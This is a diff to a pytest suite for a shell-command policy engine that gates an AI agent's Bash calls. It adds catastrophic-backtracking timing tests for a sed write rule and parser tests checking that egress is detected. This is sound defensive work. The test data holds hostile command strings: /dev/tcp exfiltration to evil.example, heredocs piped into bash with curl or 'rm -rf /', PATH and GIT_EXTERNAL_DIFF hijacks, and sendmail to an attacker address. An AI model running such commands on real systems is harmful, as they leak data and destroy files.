@@ -11,8 +11,10 @@ from __future__ import annotations
 
 import json
 import os
+import signal
 import sys
 import tempfile
+import time
 from pathlib import Path
 from unittest.mock import patch
 
@@ -959,6 +961,212 @@ class TestBashWriteToPath:
             "cpo",
         )
         assert result is None
+
+
+# ===================================================================
+# 6b. WRITE-PATTERN BACKTRACKING (ReDoS) — availability of the gate
+# ===================================================================
+
+class TestWritePatternBacktracking:
+    """The write patterns must answer in bounded time on the EXPONENTIAL axes.
+
+    WHY THIS EXISTS. `bash_write_to_path` is in the live enforcing set and
+    pre-tool-use.sh puts NO time bound on it, so a pattern that backtracks
+    catastrophically does not merely run slowly — it wedges the officer's own
+    gate forever, at 99% CPU, with nothing reporting it. Measured on the real
+    shadow record: 52 of 80,307 recorded officer tool calls exceeded 1.5s in
+    the `sed` pattern alone, the smallest being an ordinary 889-byte heredoc.
+
+    These arms FAIL against the pre-fix pattern: at 24 quoted pairs the old
+    expression needs ~2**24 decompositions and does not finish in minutes,
+    while the rewritten one answers in microseconds. The 5s bound is therefore
+    a ~5-order-of-magnitude margin on those axes, not a tight timing assertion
+    — it does not flake on a loaded shared runner.
+
+    HONEST SCOPE, so the class name does not promise more than it checks. Two
+    ambiguities were closed: quote-tiling, and multiple separators inside one
+    quoted span. A THIRD axis is still polynomial and is NOT covered by the 5s
+    bound — the in-place-flag alternation's split point times the number of
+    `sed` occurrences, which reaches ~1s at 2.8KB and ~5s at 4.9KB. It measures
+    within 3% of master, so it is not a regression, but it is open: declared as
+    RES-019(a) and pinned below by `test_flag_alternation_axis_is_still_cubic`,
+    which asserts the CURRENT ceiling rather than a fixed one. That arm exists
+    so this class cannot quietly read as "bounded on all input".
+    """
+
+    POLICY = {
+        "name": "codebase-bash-write",
+        "type": "bash_write_to_path",
+        "path_pattern": "/workspace/[a-z0-9][a-z0-9-]*/",
+        "exempt_officers": ["cto"],
+        "message": "Only CTO can write via Bash",
+    }
+    BOUND_S = 5.0
+
+    @staticmethod
+    def _wedge(pairs: int) -> str:
+        """A command the OLD sed pattern cannot answer: many quoted spans that
+        `[^;&|]` can also tile character-by-character, and no path at the end so
+        every decomposition must be tried before reporting no-match."""
+        return "sed -i" + ("'a'" * pairs) + " /nope"
+
+    @staticmethod
+    def _wedge_multisep(spans: int, seps: int = 2) -> str:
+        """The SECOND pump, and the one that matters most here.
+
+        The first rewrite of this pattern killed the quote-tiling ambiguity and
+        was still exponential, because a quoted span holding s separators could
+        be split s ways and that unit sat inside the outer star. It survived
+        `'a;b'` (one separator per span) and died at 110 bytes on `';;'`. Any
+        future rewrite must be pumped with MORE THAN ONE separator per span or
+        the arm proves nothing.
+        """
+        return "sed " + ("'" + ";" * seps + "'") * spans + " X"
+
+    def _timed(self, command: str) -> float:
+        """Evaluate under a hard SIGALRM bound and return the elapsed seconds.
+
+        The bound is on the CALL, not merely asserted afterwards: against the
+        pre-fix pattern this input never returns, so a plain
+        measure-then-assert would hang the suite until CI's own timeout killed
+        it — a red that looks like infrastructure, not like this defect. With
+        the alarm the same input fails in BOUND_S with the reason attached.
+        """
+        def _fire(signum, frame):  # noqa: ARG001
+            raise AssertionError(
+                f"write-pattern evaluation exceeded {self.BOUND_S}s on a "
+                f"{len(command)}-byte command — catastrophic backtracking is "
+                f"back, and pre-tool-use.sh has no timeout to contain it"
+            )
+
+        previous = signal.signal(signal.SIGALRM, _fire)
+        start = time.monotonic()
+        try:
+            signal.setitimer(signal.ITIMER_REAL, self.BOUND_S)
+            check_bash_write_to_path(command, self.POLICY["path_pattern"])
+        finally:
+            signal.setitimer(signal.ITIMER_REAL, 0)
+            signal.signal(signal.SIGALRM, previous)
+        return time.monotonic() - start
+
+    @pytest.mark.parametrize("pairs", [16, 20, 24])
+    def test_quoted_pair_flood_is_bounded(self, pairs):
+        elapsed = self._timed(self._wedge(pairs))
+        assert elapsed < self.BOUND_S, (
+            f"{pairs} quoted pairs took {elapsed:.2f}s — the write patterns are "
+            f"backtracking again, and the live hook has no timeout to catch it"
+        )
+
+    def test_growth_is_not_exponential(self):
+        """Doubling the hostile input must not explode the runtime.
+
+        The signature of the old defect was ~7x per two added quote pairs. A
+        flat ratio is the property that actually matters; the absolute bounds
+        above would still pass on a merely-slow pattern.
+        """
+        small = self._timed(self._wedge(12))
+        large = self._timed(self._wedge(24))
+        floor = 1e-4  # timer granularity — both arms are microseconds
+        assert large < max(small, floor) * 50 + 0.5, (
+            f"12 pairs={small:.6f}s but 24 pairs={large:.6f}s — superlinear "
+            f"growth means the ambiguous decomposition is back"
+        )
+
+    def test_long_separator_free_command_is_bounded(self):
+        """The live shape: a long quoted heredoc with no unquoted separator."""
+        body = " ".join(f"'chunk{i}'" for i in range(200))
+        elapsed = self._timed(f"sed -i {body} /tmp/not-a-workspace-path")
+        assert elapsed < self.BOUND_S, f"took {elapsed:.2f}s"
+
+    @pytest.mark.parametrize("spans,seps", [(26, 2), (20, 3), (16, 4), (32, 2)])
+    def test_multi_separator_quoted_spans_are_bounded(self, spans, seps):
+        """Several separators inside each quoted span — the second pump."""
+        elapsed = self._timed(self._wedge_multisep(spans, seps))
+        assert elapsed < self.BOUND_S, (
+            f"{spans} spans of {seps} separators took {elapsed:.2f}s — the "
+            f"quoted span is being parsed more than one way again"
+        )
+
+    @pytest.mark.parametrize("command", [
+        # shapes an officer could plausibly type, carrying repeated in-quote
+        # separators. Each of these wedged the first rewrite.
+        "sed -i.bak " + "-e 's/;;/;/g' " * 20 + "report.csv",
+        "sed -i " + "'a;b;c' " * 24,
+        "sed -i '' config.txt\n" + "echo 'step N; run; done'\n" * 24,
+    ])
+    def test_realistic_multi_separator_commands_are_bounded(self, command):
+        elapsed = self._timed(command)
+        assert elapsed < self.BOUND_S, f"took {elapsed:.2f}s on {len(command)} bytes"
+
+    def test_flag_alternation_axis_is_still_cubic(self):
+        """Pin the axis this fix did NOT close, so nobody re-discovers it.
+
+        Repeated `sed -i ` tokens make the flag alternation's split point free
+        and restart `re.search` at each occurrence. This is deliberately a
+        CHARACTERISATION arm, not an aspiration: it asserts the size at which
+        the shipped pattern is still comfortable AND that a modest input has
+        not silently become catastrophic. If a future rewrite closes the axis,
+        this arm keeps passing; if one makes it worse, it fails.
+        """
+        small = self._timed("sed -i x " * 100 + "/nope")
+        assert small < 1.0, (
+            f"900 bytes of repeated sed took {small:.2f}s — this axis was ~0.03s "
+            f"when RES-019(a) was written; it has regressed"
+        )
+        # And the honest ceiling: ~2.8KB is around a second on this axis today.
+        mid = self._timed("sed -i x " * 312 + "/nope")
+        assert mid < self.BOUND_S, f"2.8KB took {mid:.2f}s"
+
+    def test_multi_separator_growth_is_not_exponential(self):
+        small = self._timed(self._wedge_multisep(12, 2))
+        large = self._timed(self._wedge_multisep(32, 2))
+        floor = 1e-4
+        assert large < max(small, floor) * 50 + 0.5, (
+            f"12 spans={small:.6f}s but 32 spans={large:.6f}s — the in-span "
+            f"separator ambiguity is back"
+        )
+
+    # --- the rewrite must not have NARROWED the rule -----------------------
+    # Each of these is a real in-place write into the product workspace that
+    # the pattern caught before the rewrite and must still catch. A faster
+    # regex that misses a write is a worse defect than a slow one.
+
+    @pytest.mark.parametrize("command", [
+        "sed -i 's/old/new/' /workspace/product/file.txt",
+        # separator INSIDE quotes must not end the statement
+        "sed -i 's/a;b/c/' /workspace/product/file.txt",
+        "sed -i 's/a|b/c/' /workspace/product/file.txt",
+        "sed -i 's/a&b/c/' /workspace/product/file.txt",
+        'sed -i "s/a;b/c/" /workspace/product/file.txt',
+        # several quoted spans, separators in more than one of them
+        "sed -i -e 's/a;b/c/' -e 's/d|e/f/' /workspace/product/file.txt",
+        # suffix and long forms
+        "sed -i.bak 's/old/new/' /workspace/product/file.txt",
+        "sed --in-place 's/old/new/' /workspace/product/file.txt",
+        "sed --in-place=.bak 's/x/y/' /workspace/product/file.txt",
+        "sed -Ei 's/old/new/' /workspace/product/file.txt",
+        # sed reached in a later statement of the command line
+        "echo hi; sed -i 's/x/y/' /workspace/product/file.txt",
+        # unbalanced quote before the flag — still a write
+        "sed -i 's/x/y/ /workspace/product/file.txt",
+    ])
+    def test_still_blocks_real_writes(self, command):
+        assert evaluate_policy(self.POLICY, "Bash", {"command": command}, "cpo") \
+            is not None, f"NARROWED: no longer blocks {command!r}"
+
+    @pytest.mark.parametrize("command", [
+        # no in-place flag — sed writes to stdout, not the file
+        "sed -n 'p' /workspace/product/file.txt",
+        "sed 's/old/new/' /workspace/product/file.txt",
+        # in-place, but the target is outside the product workspace
+        "sed -i 's/old/new/' /tmp/file.txt",
+        # an unquoted separator really does end the statement: the -i belongs
+        # to the first command, the workspace path to a different one
+        "sed -i 's/x/y/' /tmp/a.txt; cat /workspace/product/file.txt",
+    ])
+    def test_still_allows_non_writes(self, command):
+        assert evaluate_policy(self.POLICY, "Bash", {"command": command}, "cpo") \
+            is None, f"WIDENED: now blocks {command!r}"
 
 
 # ===================================================================
@@ -3126,3 +3334,202 @@ class TestLiveBlocklistBypasses:
         from framework.authority.policy_engine import UNRESOLVED
         assert UNRESOLVED in extract_invoked_binaries("ls && bash /tmp/exfil.sh")
         assert UNRESOLVED not in extract_invoked_binaries("bash -c 'sudo ls'")
+
+
+# ---------------------------------------------------------------------------
+# The command word must BE a command — measured defect, 2026-07-27
+# ---------------------------------------------------------------------------
+#
+# A dry run replayed the authority matrix over 39,797 real recorded Bash
+# commands. 347 DISTINCT tokens that are not programs at all were being
+# resolved as the command word — bare `1`, `)`, `#`, `.`,
+# `REDIS_HOST:-localhost`, and whole sentences lifted out of heredoc bodies —
+# and the neighbouring "only real binaries" bucket was optimistic for the same
+# reason (its 609 tokens included `A`, `ACK`, `ALLOW`, `AND`, `API`). Each
+# class below is one root cause, with the shape that produced it in the real
+# corpus. Every arm here FAILS against the pre-change parser.
+
+class TestCommandWordIsAProgram:
+    """Root cause -> the token it manufactured. One arm each."""
+
+    def test_redirect_ampersand_is_not_a_separator(self):
+        """`2>&1` — `&` was a statement separator even inside a redirection
+        operator, so `2>` and `1` became separate statements and the DIGIT `1`
+        became a command word. Largest single cause: 14,943 records."""
+        bins = extract_invoked_binaries("redis-cli ping 2>&1 | head -1")
+        assert "1" not in bins
+        assert set(bins) == {"redis-cli", "head"}
+        for cmd in ("ls >&2", "ls &>/dev/null", "ls 2>&1", "ls |& cat"):
+            assert "1" not in extract_invoked_binaries(cmd)
+            assert "2" not in extract_invoked_binaries(cmd)
+
+    def test_parameter_expansion_is_not_a_brace_group(self):
+        """`${REDIS_HOST:-localhost}` — `{`/`}` were unconditional statement
+        boundaries, so the parameter name plus its default became a command
+        word in 602 records."""
+        bins = extract_invoked_binaries('redis-cli -h "${REDIS_HOST:-localhost}" ping')
+        assert bins == ["redis-cli"]
+        assert "REDIS_HOST:-localhost" not in extract_invoked_binaries(
+            'echo "${REDIS_HOST:-localhost}"')
+
+    def test_double_quote_scanner_understands_nesting(self):
+        """`"a $(f "$b") c"` is ONE word to bash. Ending the span at the inner
+        quote desynchronised everything after it, manufacturing ` -p $`,
+        `null | head -1)` and `) :: $(grep …)` out of a redis-cli call."""
+        cmd = ('echo "T=$(redis-cli -h "${REDIS_HOST:-localhost}" '
+               '-p "${REDIS_PORT:-6379}" XLEN k 2>/dev/null | head -1)"')
+        assert set(extract_invoked_binaries(cmd)) == {"echo", "redis-cli", "head"}
+
+    def test_comments_are_not_statements(self):
+        """shlex does not strip comments and neither did the splitter, so every
+        commented line became a statement whose first word was a `binary`."""
+        bins = extract_invoked_binaries("ls -la\n# deliver the scrum (lag=1)\necho hi")
+        assert bins == ["ls", "echo"]
+        assert "#" not in extract_invoked_binaries("ls\n## heading\n### deeper")
+
+    def test_a_hash_inside_a_word_is_not_a_comment(self):
+        """Anti-vacuity for the arm above: stripping too much would hide a
+        real command."""
+        assert "curl" in extract_invoked_binaries("curl https://x/page#frag")
+        assert "echo" in extract_invoked_binaries('echo "${v#prefix}"')
+
+    def test_heredoc_body_for_a_data_consumer_is_data(self):
+        """`cat >> notes.md <<'EOF'` fed MARKDOWN to the shell parser, so `##`
+        and whole sentences became command words."""
+        cmd = "cat >> notes.md <<'EOF'\n## full authority\n- a bullet\nEOF"
+        assert extract_invoked_binaries(cmd) == ["cat"]
+
+    def test_heredoc_body_for_an_interpreter_is_not_shell(self):
+        cmd = "python3.12 <<'PY'\nimport json\nprint(json.load(f).get('x'))\nPY"
+        assert extract_invoked_binaries(cmd) == ["python3.12"]
+
+    def test_arithmetic_expansion_invokes_nothing(self):
+        """`$((NOW-START))` yielded the command `(NOW-START)`."""
+        assert extract_invoked_binaries("echo $((NOW-START))") == ["echo"]
+        assert "i++" not in extract_invoked_binaries("(( i++ ))\necho done")
+
+    def test_find_exec_placeholder_is_not_a_brace_group(self):
+        r"""`find . -exec cat {} \;` split at `{}`, leaving `\;` alone to
+        reduce to the command `;`."""
+        bins = extract_invoked_binaries(r"find . -name x -exec cat {} \; | head -30")
+        assert ";" not in bins
+        assert set(bins) == {"find", "head"}
+
+    def test_case_patterns_are_not_commands(self):
+        """`polads-ceo)` is a PATTERN; bash never executes it. The subject of
+        `case "$x" in` is not a command either."""
+        cmd = 'case "$x" in\n  polads-ceo) echo one;;\n  *) echo other;;\nesac'
+        assert set(extract_invoked_binaries(cmd)) == {"echo"}
+        assert "$x" not in extract_invoked_binaries(cmd)
+
+    def test_loop_variable_is_not_a_command(self):
+        """`for d in a b c` names a loop VARIABLE; `d`, `f`, `x`, `p`, `i` and
+        `o` were all being counted as programs."""
+        assert extract_invoked_binaries(
+            "for d in draft-reply ledger; do echo $d; done") == ["echo"]
+
+    def test_command_substitution_text_does_not_leak_into_its_container(self):
+        """`MF=$(find ~/vault/3-People -name x)` resolved the command word
+        `3-People`, because the substitution's TEXT stayed in the enclosing
+        statement and shlex split on the spaces inside it."""
+        from framework.authority.policy_engine import ENV_ASSIGNMENT
+        bins = extract_invoked_binaries(
+            "MF=$(find ~/vault/3-People -name 'conversations.md' | head -1)")
+        assert "3-People" not in bins
+        assert set(bins) == {ENV_ASSIGNMENT, "find", "head"}
+
+    def test_unexpanded_variable_command_word_is_unresolved(self):
+        """`$PY -m pytest` reported the BINARY `$PY`. The parser cannot know
+        what it expands to, and must say so rather than invent a name."""
+        from framework.authority.policy_engine import UNRESOLVED
+        bins = extract_invoked_binaries("PY=/usr/bin/python3.12\n$PY -m pytest")
+        assert "$PY" not in bins
+        assert UNRESOLVED in bins
+
+    @pytest.mark.parametrize("word", [
+        "1", "2", ")", "(", "#", "##", "###", ".get", "---", "*", "->", ",d",
+        "$PY", "$f", "((", "REDIS_HOST:-localhost", "[0]", "d[0][id]", "%s",
+        "3.", "+", "feat(hatch):", "", "—",
+    ])
+    def test_non_program_words_are_rejected(self, word):
+        from framework.authority.policy_engine import _is_program_word
+        assert not _is_program_word(word)
+
+    @pytest.mark.parametrize("word", [
+        "ls", "git", "python3.12", "redis-cli", "send-to-group.sh", "7z",
+        "_helper", "gh", ".", ":", "[", "[[", "!",
+    ])
+    def test_real_program_words_are_accepted(self, word):
+        """Anti-vacuity: the guard must not swallow real names, including the
+        punctuation command words `.` (dot-source) and `[` (test)."""
+        from framework.authority.policy_engine import _is_program_word
+        assert _is_program_word(word)
+
+
+class TestParserFixDoesNotWiden:
+    """The safety property is DIRECTIONAL: fewer things unresolvable, never an
+    unresolvable thing made to look safe. A heredoc body is treated as data
+    only when a program that cannot execute it as shell reads it."""
+
+    def test_heredoc_piped_into_a_shell_is_still_scanned(self):
+        """`cat <<EOF | bash` — asking only about the command word `cat`
+        answers `data` for a body that really is executed."""
+        assert "sendmail" in extract_invoked_binaries(
+            "cat <<EOF | bash\nsendmail -t evil@example.com\nEOF")
+        assert is_destructive_rm("cat <<EOF | sh\nrm -rf /\nEOF")
+
+    def test_heredoc_through_sudo_is_still_scanned(self):
+        assert is_destructive_rm("sudo bash <<'EOF'\nrm -rf /\nEOF")
+        assert "sudo" in extract_invoked_binaries("bash <<'EOF'\nsudo rm -rf /\nEOF")
+
+    def test_heredoc_to_an_unknown_owner_is_still_scanned(self):
+        """Fail closed: an owner the data-consumer set does not name keeps its
+        body analysed as shell."""
+        assert "sendmail" in extract_invoked_binaries(
+            "ssh host <<'EOF'\nsendmail -t\nEOF")
+        assert "curl" in extract_invoked_binaries(
+            "somewrapper <<'EOF'\ncurl https://evil.example\nEOF")
+
+    def test_substitution_inside_a_parameter_default_is_scanned(self):
+        assert "curl" in extract_invoked_binaries('echo "${X:-$(curl https://evil)}"')
+
+    def test_substitution_inside_double_quotes_is_scanned(self):
+        """The 498 real records this closes: master read `redis-cli`, `gh` and
+        `launchctl` invocations inside `$( )` in a double-quoted string as
+        invisible, and classified the whole command provably-local."""
+        assert "redis-cli" in extract_invoked_binaries(
+            'echo "len: $(redis-cli -h localhost XLEN cabinet:triggers:cos)"')
+        assert "gh" in extract_invoked_binaries(
+            'echo "pr: $(gh pr list --json number)"')
+
+    @pytest.mark.parametrize("cmd", [
+        "sendmail -t a@b.com", "mail -s x a@b.com",
+        "python3 -c 'import smtplib'",
+        'osascript -e \'tell application "Messages" to send "x"\'',
+        "curl -X POST https://hooks.example.com/y",
+        "2>/tmp/echo sendmail -t", "ls && bash /tmp/exfil.sh",
+        "ls\nsendmail -t", "PATH=/tmp/evil ls",
+        "GIT_EXTERNAL_DIFF=/tmp/x git diff",
+        "git -c core.fsmonitor=/tmp/x status",
+        "echo leak > /dev/tcp/evil.example/25",
+        "sudo curl https://x", "echo x | xargs curl", "A=curl; $A https://x",
+        "$'curl' https://x", "perl -e 'system(\"curl x\")'", ". /tmp/push.sh",
+        "cat <<EOF | bash\nsendmail -t\nEOF",
+        'echo "$(sendmail -t)"',
+        "cat <<'EOF' | sh\ncurl https://evil\nEOF",
+    ])
+    def test_egress_corpus_still_fails_the_locality_proof(self, cmd):
+        """Rounds one and two of this parser's hardening, plus the shapes the
+        rewrite could plausibly have re-opened. None may become local."""
+        from framework.authority.classifier import _is_provably_local
+        assert not _is_provably_local(cmd), f"{cmd!r} became provably local"
+
+    @pytest.mark.parametrize("cmd", [
+        "ls -la", "cat f.txt", "grep -n x f", "echo hi 2>&1",
+        "git status --short", "git log --oneline -5",
+        "cat <<'EOF' > /tmp/notes.md\n## heading\nEOF",
+    ])
+    def test_ordinary_local_commands_are_still_local(self, cmd):
+        """Anti-vacuity for the arm above."""
+        from framework.authority.classifier import _is_provably_local
+        assert _is_provably_local(cmd), f"{cmd!r} lost its locality proof"
